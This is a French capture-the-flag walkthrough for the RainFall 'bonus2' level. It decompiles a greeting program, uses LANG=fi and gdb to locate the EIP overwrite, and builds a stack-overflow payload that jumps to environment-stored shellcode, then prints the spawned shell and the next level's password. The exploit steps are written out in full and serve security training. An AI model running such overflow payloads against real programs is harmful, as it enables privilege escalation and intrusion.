# **Bonus 02**

Pour le `bonus2`, on decompile le code:

```
void greetuser(void)
{
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined2 local_3c;
  undefined local_3a;
  
  if (language == 1) {
    local_4c = 0xc3767948;
    local_48 = 0x20a4c3a4;
    local_44 = 0x69a4c370;
    local_40 = 0xc3a4c376;
    local_3c = 0x20a4;
    local_3a = 0;
  }
  else if (language == 2) {
    local_4c = 0x64656f47;
    local_48 = 0x64696d65;
    local_44 = 0x21676164;
    local_40 = CONCAT22(local_40._2_2_,0x20);
  }
  else if (language == 0) {
    local_4c = 0x6c6c6548;
    local_48 = CONCAT13(local_48._3_1_,0x206f);
  }
  strcat((char *)&local_4c,&stack0x00000004);
  puts((char *)&local_4c);
  return;
}

undefined4 main(int param_1,int param_2)
{
  undefined4 uVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  byte bVar5;
  undefined4 local_60 [10];
  char acStack_38 [36];
  char *local_14;
  
  bVar5 = 0;
  if (param_1 == 3) {
    puVar3 = local_60;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    strncpy((char *)local_60,*(char **)(param_2 + 4),0x28);
    strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
    local_14 = getenv("LANG");
    if (local_14 != (char *)0x0) {
      iVar2 = memcmp(local_14,&DAT_0804873d,2);
      if (iVar2 == 0) {
        language = 1;
      }
      else {
        iVar2 = memcmp(local_14,&DAT_08048740,2);
        if (iVar2 == 0) {
          language = 2;
        }
      }
    }
    puVar3 = local_60;
    puVar4 = (undefined4 *)&stack0xffffff50;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *puVar3;
      puVar3 = puVar3 + (uint)bVar5 * -2 + 1;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
    uVar1 = greetuser();
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

Pour ce niveau, le code n'etant pas clair, on decide de le tester, pour ce faire on voit que la fonction prend 2 arguments donc va remplir les buffer pour voir si on `SEGFAULT`

```
bonus2@RainFall:~$ ./bonus2 $(python -c "print'a'*20 + ' ' + 'b'*20")
Hello aaaaaaaaaaaaaaaaaaaa
bonus2@RainFall:~$ ./bonus2 $(python -c "print'a'*30 + ' ' + 'b'*30")
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
bonus2@RainFall:~$ ./bonus2 $(python -c "print'a'*40 + ' ' + 'b'*40")
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
Segmentation fault (core dumped)
bonus2@RainFall:~$ ./bonus2 $(python -c "print'a'*50 + ' ' + 'b'*50")
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
Segmentation fault (core dumped)
bonus2@RainFall:~$ ./bonus2 $(python -c "print'a'*40 + ' ' + 'b'*30")
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
Segmentation fault (core dumped)
bonus2@RainFall:~$ ./bonus2 $(python -c "print'a'*30 + ' ' + 'b'*40")
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Avec ces tests, nous savons que la fonction `SEGFAULT` si le premier arguments a au moins 40 caracteres
Maintenant nous regardons sur quelle caractere l'executable segfault avec `gdb`

```
(gdb) run $(python -c "print'a'*50 + ' ' + 'b'*50")
Starting program: /home/user/bonus2/bonus2 $(python -c "print'a'*50 + ' ' + 'b'*50")
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

Program received signal SIGSEGV, Segmentation fault.
0x08006262 in ?? ()
```

Il segfault sur les `b` donc sur le deuxieme arguments mais on remarque qu'un `0x0800` viens ce glisser au milieu, donc on test de changer la variable `LANG` pour regler ce probleme

```
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ gdb bonus2
(gdb) run $(python -c "print'a'*50 + ' ' + 'b'*50")
Starting program: /home/user/bonus2/bonus2 $(python -c "print'a'*50 + ' ' + 'b'*50")
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) 
```

Cela regle le probleme, maintenant trouvons la position exact des caracteres qui sont utilise par eip et remplacons les par notre `SHELLCODE` de l'env du `bonus0`

```
(gdb) run $(python -c "print'a'*50 + ' ' + 'abcdefghijklmnopqrstuvwxyz'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c "print'a'*50 + ' ' + 'abcdefghijklmnopqrstuvwxyz'")
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghijklmnopqrstuvwxyz

Program received signal SIGSEGV, Segmentation fault.
0x76757473 in ?? ()
```

> `0x76757473` correspond a `stuv`

```
bonus2@RainFall:/var/crash$ cat getenvaddr.c 
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv, char **env)
{
	printf("Addr of %s = %p\n", argv[argc-1], getenv(argv[argc - 1]));
}
bonus2@RainFall:/var/crash$ ./a.out SHELLCODE
Addr of SHELLCODE = 0xbffff708
bonus2@RainFall:/var/crash$ cd -
/home/user/bonus2
bonus2@RainFall:~$ ./bonus2 $(python -c "print'a'*40+' '+'b'*18+'\x08\xf8\xff\xbf'")
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbb���
$ id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
